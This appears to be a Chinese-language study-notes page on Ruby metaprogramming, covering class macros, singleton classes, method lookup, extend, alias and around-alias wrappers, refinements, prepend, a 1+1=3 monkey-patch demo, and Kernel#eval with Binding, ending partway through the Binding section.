<h4 id="类宏"><a href="#类宏" class="headerlink" title="类宏"></a>类宏</h4><p>​    Ruby中的对象是没有属性的，对外只提供方法。所以在最初我们访问对象的实例变量时，可以写get，set方法，但是这会很麻烦，所以我们使用<code>Module#attr_accessor :var</code>访问器，这也叫做<strong>类宏</strong>，所属于<code>Module#attr_*</code>，类宏看起来很像关键字，实际上只是普通的方法，只不过可以在类定义中使用</p>
<h3 id="使用类宏"><a href="#使用类宏" class="headerlink" title="使用类宏"></a>使用类宏</h3><blockquote>
<p>我们原有的Book类中有名为：<code>GetTitle , title2 , LEND_TO_USER</code>，但是按照Ruby的惯例，他们应该分别命名为：<code>get_title,title.lend_to_user</code>，不过其他项目也在使用Book类，而我们不能修改那些项目，如果简单修改方法名，就会破坏其他的调用者</p>
<p>我们可以使用类宏声明这些旧方法名已被弃用，这样就可以修改方法名了</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Book</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">title</span></span> <span class="token punctuation">;</span> <span class="token keyword">end</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">subtitle</span></span> <span class="token punctuation">;</span> <span class="token keyword">end</span>
  
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">deprecate</span></span><span class="token punctuation">(</span>old_method<span class="token punctuation">,</span>new_method<span class="token punctuation">)</span>
    <span class="token keyword">define_method</span><span class="token punctuation">(</span>old_method<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">&amp;</span>block<span class="token operator">|</span>
      warn <span class="token string-literal"><span class="token string">"Warning: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">old_method</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> is deprecated , Use </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">new_method</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
      send<span class="token punctuation">(</span>new_method<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">&amp;</span>block<span class="token punctuation">)</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  deprecate <span class="token symbol">:GetTitle</span><span class="token punctuation">,</span> <span class="token symbol">:title</span>
  deprecate <span class="token symbol">:LENT_TO_USER</span><span class="token punctuation">,</span> <span class="token symbol">:lent_to</span>
  deprecate <span class="token symbol">:title2</span><span class="token punctuation">,</span> <span class="token symbol">:subtitle</span>
<span class="token keyword">end</span>

b <span class="token operator">=</span> <span class="token class-name">Book</span><span class="token punctuation">.</span><span class="token keyword">new</span>
b<span class="token punctuation">.</span><span class="token constant">LENT_TO_USER</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"Bill"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="单件类"><a href="#单件类" class="headerlink" title="单件类"></a>单件类</h3><blockquote>
<p>提问：单件方法，类方法的信息是保存在哪里？</p>
</blockquote>
<p>​    首先不在对象中，因为只有类和模块儿可以定义方法</p>
<p>​    其次也不在类中，因为无法在类的对象中共享，它们就好像是一个独立个体，存在与某个与当前类有关的地方，这个地方就是<strong>单件类</strong>，负责存储单件方法。</p>
<blockquote>
<p>那我们该如何访问到单间类内？如何看到它？</p>
</blockquote>
<p>两种方式：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
single_class <span class="token operator">=</span> <span class="token keyword">class</span> <span class="token operator">&lt;&lt;</span> obj
	<span class="token comment"># 返回单件类</span>
	<span class="token keyword">self</span>
<span class="token keyword">end</span>
p single_class  <span class="token comment"># => #&lt;Class:#&lt;MyClass:0x0000000108beb5c8>></span>
p single_class<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token comment"># => Class</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token comment"># 访问对象所属单件类，每个对象的单件类都不同</span>
<span class="token comment"># #&lt;Class:#&lt;MyClass:0x00000001051f3a78>></span>
p obj<span class="token punctuation">.</span>singleton_class
other <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token comment"># #&lt;Class:#&lt;MyClass:0x00000001051f3578>></span>
p other<span class="token punctuation">.</span>singleton_class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    单件类只有一个实例，且无法被继承，单件方法就定义在单件类中</p>
<h3 id="补充方法查找"><a href="#补充方法查找" class="headerlink" title="补充方法查找"></a>补充方法查找</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">C</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">a_method</span></span>
    <span class="token string-literal"><span class="token string">'C#a_method'</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">D</span> <span class="token operator">&lt;</span> <span class="token constant">C</span> <span class="token punctuation">;</span> <span class="token keyword">end</span>

obj <span class="token operator">=</span> <span class="token class-name">D</span><span class="token punctuation">.</span><span class="token keyword">new</span>
p obj<span class="token punctuation">.</span>a_method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们画出obj一起祖先链的图，先不考虑单件类和模块</p>
<img src="../../typora-user-images/image-20230127215743350.png" alt="image-20230127215743350" style="zoom:67%;" />

<h4 id="单件类-和-方法查找"><a href="#单件类-和-方法查找" class="headerlink" title="单件类 和 方法查找"></a>单件类 和 方法查找</h4><blockquote>
<p>单件类的超类是什么？</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token comment"># #&lt;Class:#&lt;MyClass:0x00000001051f3a78>></span>
p obj<span class="token punctuation">.</span>singleton_class
<span class="token comment"># 对象的单件类的超类 就是 对象的所属类</span>
p obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>superclass  <span class="token comment"># => MyClass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>单件类是否在祖先链中，因为这涉及到方法的查找</p>
</blockquote>
<p>​    单件类是存在于祖先链中的，而且单件类的超类为对象的所属类，所以在祖先链中排在当前类之右边。方法查找也是按照这个顺序进行查找的。所以对象访问方法时，是先在单件类中访问，然后再去当前类中访问。</p>
<blockquote>
<p>类的单件类的超类就是超类的单件类</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">D</span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">E</span> <span class="token operator">&lt;</span> <span class="token constant">D</span>
<span class="token keyword">end</span>

p <span class="token constant">D</span><span class="token punctuation">.</span>singleton_class   <span class="token comment"># => #&lt;Class:D></span>
p <span class="token constant">E</span><span class="token punctuation">.</span>singleton_class   <span class="token comment"># => #&lt;Class:E></span>
p <span class="token constant">D</span><span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>superclass  <span class="token comment"># => #&lt;Class:Object></span>
p <span class="token constant">E</span><span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>superclass  <span class="token comment"># => #&lt;Class:D></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>上面的定义看起来有点儿绕，Ruby为何这样设计？</p>
</blockquote>
<p>​    因为这样就可以在子类中调用父类的类方法</p>
<p>​    <img src="../../typora-user-images/image-20230103164540176.png" alt="image-20230103164540176" style="zoom:80%;" /></p>
<blockquote>
<p>我们再来画一下有了单件类后的祖先链和方法查找</p>
</blockquote>
<img src="../../typora-user-images/image-20230127220319776.png" alt="image-20230127220319776" style="zoom:67%;" />

<h4 id="七条规则"><a href="#七条规则" class="headerlink" title="七条规则"></a>七条规则</h4><ol>
<li>对象：要么是普通对象，要么是模块儿</li>
<li>模块：可以是普通模块，一个类或一个单件类</li>
<li>方法：存在与一个模块中，通常定义在类中</li>
<li>对象都有自己真正的类，要么是普通类，要么是单件类</li>
<li>除了BasicObject没有超类，其他的类都有一个祖先</li>
<li>一个对象的单件类的超类，就是这对象的类</li>
<li>一个类的单件类的超类，就是这个类的超类的单件类</li>
<li>调用一个方法时，Ruby先找到接收者真的类，再向上进入祖先链</li>
</ol>
<h4 id="类方法的语法"><a href="#类方法的语法" class="headerlink" title="类方法的语法"></a>类方法的语法</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
<span class="token keyword">end</span>
<span class="token comment"># 1</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token function">one</span></span> <span class="token punctuation">;</span> <span class="token keyword">end</span>
<span class="token comment"># 2</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">two</span></span> <span class="token punctuation">;</span> <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 3</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">class</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">self</span>
		<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">three</span></span> <span class="token punctuation">;</span><span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="单件类-和-instance-eval-方法"><a href="#单件类-和-instance-eval-方法" class="headerlink" title="单件类 和 instance_eval 方法"></a>单件类 和 instance_eval 方法</h4><p>​    之前我们说<code>instance_eval</code>修改self，实际上也修改当前类为接收者的单件类。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">s1 <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"abc"</span></span>

s1<span class="token punctuation">.</span>instance_eval <span class="token keyword">do</span>
  <span class="token comment"># 这里的swooh！self对象为“abc”的单件方法</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">swoosh</span></span><span class="token operator">!</span>
		reverse
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

p s1<span class="token punctuation">.</span>swoosh<span class="token operator">!</span>   <span class="token comment"># => cba</span>
s2 <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'qsc'</span></span>  
p s2<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:swoosh!</span><span class="token punctuation">)</span>  <span class="token comment"># => false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h3><blockquote>
<p>我们知道，使用<code>Module#attr_accessor</code>可以为对象创建属性</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	attr_accessor <span class="token symbol">:name</span>
<span class="token keyword">end</span>

obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"张三"</span></span>
p obj<span class="token punctuation">.</span>name <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>如果我们想给类创建对象怎么办？可以在Class中定义类宏，每个类实际上是Class的实例对象，这样也就拥有了自己的属性</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">Class</span>
	attr_accessor <span class="token symbol">:name</span>
<span class="token keyword">end</span>

MyClass<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"张三"</span></span>
p MyClass<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>但是这样每个类都拥有了属性，我们只希望MyClass中拥有属性</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">class</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">self</span>
		attr_accessor <span class="token symbol">:name</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

MyClass<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"张三"</span></span>
p MyClass<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="模块儿的麻烦"><a href="#模块儿的麻烦" class="headerlink" title="模块儿的麻烦"></a>模块儿的麻烦</h3><blockquote>
<p>我们试图在模块中定义模块的类方法，然后在一个类中引用该模块，试图将模块的类方法转为类的类方法</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">MyModule</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">my_method</span></span><span class="token punctuation">;</span> <span class="token string-literal"><span class="token string">"Hello"</span></span> <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">include</span> MyModule
<span class="token keyword">end</span>

MyClass<span class="token punctuation">.</span>my_method  <span class="token comment"># => 报错，因为MyModule中的my_method为一个单件方法，不能被触碰</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>我们看看我们能解决这个问题吗？将模块中的方法，转为类的类方法</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">MyModule</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span><span class="token punctuation">;</span> <span class="token string-literal"><span class="token string">"Hello"</span></span> <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">class</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">self</span>
		<span class="token keyword">include</span> MyModule
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

MyClass<span class="token punctuation">.</span>my_method  <span class="token comment"># => "Hello"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    my_method方法是MyClass的单件类的一个实例方法，这样也就是MyClass的类方法，这种技巧叫做<strong>类扩展</strong>，同样的技巧也适用于对象，毕竟类也是一个对象</p>
<h4 id="对象扩展"><a href="#对象扩展" class="headerlink" title="对象扩展"></a>对象扩展</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">MyModule</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		p <span class="token string-literal"><span class="token string">"Hello World"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token keyword">class</span> <span class="token operator">&lt;&lt;</span> obj
	<span class="token comment"># 单件类所属obj，所以引入的方法，会作为对象的单件方法</span>
	<span class="token keyword">include</span> MyModule
<span class="token keyword">end</span>
obj<span class="token punctuation">.</span>my_method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这称为<strong>对象扩展</strong></p>
<h4 id="Object-extend"><a href="#Object-extend" class="headerlink" title="Object#extend"></a>Object#extend</h4><blockquote>
<p>类扩展，对象扩展 因为用的很多，所以Ruby提供了<code>Object#extend</code>方法</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">MyModule</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		p <span class="token string-literal"><span class="token string">"Hello World"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">extend</span> MyModule
<span class="token keyword">end</span>
MyClass<span class="token punctuation">.</span>my_method

obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span><span class="token keyword">extend</span> MyModule
obj<span class="token punctuation">.</span>my_method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="方法包装器"><a href="#方法包装器" class="headerlink" title="方法包装器"></a>方法包装器</h3><blockquote>
<p>如何在原有函数不修改的前提下，对方法做增强，在此之前我们介绍一些新的东西</p>
</blockquote>
<h4 id="方法别名"><a href="#方法别名" class="headerlink" title="方法别名"></a>方法别名</h4><p>​    <code>alias_method :new_method_name , :old_method_name</code> 对方法起一个别名</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">one</span></span>
		p <span class="token string-literal"><span class="token string">"Hello one"</span></span>
	<span class="token keyword">end</span>
	alias_method <span class="token symbol">:two</span><span class="token punctuation">,</span><span class="token symbol">:one</span>
<span class="token keyword">end</span>

obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>one  <span class="token comment"># => “Hello one”</span>
obj<span class="token punctuation">.</span>two  <span class="token comment"># => “Hello one”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    别名在Ruby中几乎随处可见，例如<code>String#size 就是 String#length</code>方法的别名，Inteager 有一个方法有至少五种别名</p>
<blockquote>
<p>如果先给一个方法起别名，又重新定义这个方法，我们看看会发生什么？</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">one</span></span>
		p <span class="token string-literal"><span class="token string">"Hello one"</span></span>
	<span class="token keyword">end</span>
	alias_method <span class="token symbol">:two</span><span class="token punctuation">,</span><span class="token symbol">:one</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">one</span></span>
		p <span class="token string-literal"><span class="token string">"good morning"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>one  <span class="token comment"># => "good morning"</span>
obj<span class="token punctuation">.</span>two  <span class="token comment"># => "Hello one"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        重定义方法时，并不是修改这个方法，而是定义一个新的方法，并将之前存在的方法名从新绑定，只要老方法还存在一个绑定，就仍可调用，这种先定义别名再重新定义方法的思想是一种有趣技巧的基础，我们举例说明</p>
<h4 id="环绕别名-类似于动态代理的效果"><a href="#环绕别名-类似于动态代理的效果" class="headerlink" title="环绕别名(类似于动态代理的效果)"></a>环绕别名(类似于动态代理的效果)</h4><ol>
<li>给方法定义一个别名</li>
<li>重定义这个方法</li>
<li>新方法中调用老的方法</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_users</span></span>
		p <span class="token string-literal"><span class="token string">"从数据库中获取数据"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 现在我们想对 MyClass#get_users做一些增强处理</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	alias_method <span class="token symbol">:get_users_origin</span><span class="token punctuation">,</span><span class="token symbol">:get_users</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_users</span></span>
		p <span class="token string-literal"><span class="token string">"检查用户权限"</span></span>
		p <span class="token string-literal"><span class="token string">"开启事务"</span></span>
		get_users_origin
		p <span class="token string-literal"><span class="token string">"提交事务"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>get_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>环绕别名的一个缺点在于它污染了你的类，添加了一个额外的名字，如果想解决这个问题，可以在添加别名之后，想办法把老版本的方法变成私有的，Ruby中 公有 和 私有 实际上是针对的方法名，而不是方法本身</p>
<p>环绕别名的另一个缺点与加载有关，不要尝试加载（load）两次环绕别名，这里留给你自己思考</p>
<p>环绕别名的最主要的问题在于它是一种猴子补丁，它有可能破坏已有的代码，Ruby2.0增加了两种额外的方式来为已有方法保证新的功能</p>
</blockquote>
<h4 id="更多方法包装器"><a href="#更多方法包装器" class="headerlink" title="更多方法包装器"></a>更多方法包装器</h4><blockquote>
<p> 细化：使用细化，可以从新定义方法，如果定义重名方法，使用super则可调用到原先的内容，叫做：<strong>细化封装器</strong></p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_users</span></span>
		p <span class="token string-literal"><span class="token string">"从数据库中获取数据"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 现在我们想对 MyClass#get_users做一些增强处理</span>
<span class="token keyword">module</span> <span class="token class-name">MyClassRefinement</span>
	refine MyClass <span class="token keyword">do</span>
		<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_users</span></span>
			p <span class="token string-literal"><span class="token string">"检查用户权限"</span></span>
			p <span class="token string-literal"><span class="token string">"开启事务"</span></span>
			<span class="token keyword">super</span>
			p <span class="token string-literal"><span class="token string">"提交事务"</span></span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

using MyClassRefinement

obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>get_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Module#prepend：因为会将引入module放入当前类的祖父链位置的前面，所以也会覆盖掉当前类中定义的方法，使用super则可调用到原先的内容，这种技术称为：<strong>下包含包装器</strong></p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_users</span></span>
		p <span class="token string-literal"><span class="token string">"从数据库中获取数据"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 现在我们想对 MyClass#get_users做一些增强处理</span>
<span class="token keyword">module</span> <span class="token class-name">ExplicitMyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_users</span></span>
		p <span class="token string-literal"><span class="token string">"检查用户权限"</span></span>
		p <span class="token string-literal"><span class="token string">"开启事务"</span></span>
		<span class="token keyword">super</span>
		p <span class="token string-literal"><span class="token string">"提交事务"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">prepend</span> ExplicitMyClass
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>get_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="测试：打破数据规律"><a href="#测试：打破数据规律" class="headerlink" title="测试：打破数据规律"></a>测试：打破数据规律</h3><blockquote>
<p>让 1 + 1 = 3</p>
</blockquote>
<p>绝大部分Ruby操作符实际上是方法， 例如整数的+只是名为Fixnum#+方法的语法糖，编写1+1时。实际上为：<code>1.+(1)</code>。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Fixnum</span>
	alias_method <span class="token symbol">:old_plus</span> <span class="token punctuation">,</span> <span class="token operator">:</span><span class="token operator">+</span>

	<span class="token keyword">def</span> <span class="token operator">+</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
		<span class="token keyword">self</span><span class="token punctuation">.</span>old_plus<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>old_plus<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
p <span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>务必要慎用这种能力，实际上我们发现Ruby中的规则简单，小巧，易操作</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul>
<li>类定义对self和当前类的影响</li>
<li>熟悉<strong>单件方法</strong>和<strong>单件类</strong>，重新认识对象模型和方法查找</li>
<li>学习了类实例变量，类宏和下包含包装器</li>
</ul>
<p>这些规则同时适用于类和模块</p>
<h2 id="编写代码的代码"><a href="#编写代码的代码" class="headerlink" title="编写代码的代码"></a>编写代码的代码</h2><h3 id="Kernel-eval"><a href="#Kernel-eval" class="headerlink" title="Kernel#eval"></a>Kernel#eval</h3><p>​    前面我们学习了：<code>instance_eval , class_eval</code>,现在我要学习<code>Kernel#eval</code>方法，它的作用是执行一段<strong>代码字符串</strong></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 执行 "p 123" 这段字符串，p 123表示输出 123 </span>
eval <span class="token string-literal"><span class="token string">"p 123"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>​    代码字符串也可以访问局部变量</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">var <span class="token operator">=</span> <span class="token number">1</span>
eval <span class="token string-literal"><span class="token string">"p var"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="Binding-绑定对象"><a href="#Binding-绑定对象" class="headerlink" title="Binding 绑定对象"></a>Binding 绑定对象</h3><p>​    Binding是用一个对象表示完整的作用域，可以使用eval方法在这个Binding对象所携带的作用域中执行代码，Kernel#binding方法可以用来常见Binding对象</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_thod</span></span>
    <span class="token variable">@x</span> <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token comment"># 返回binding</span>
    binding
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
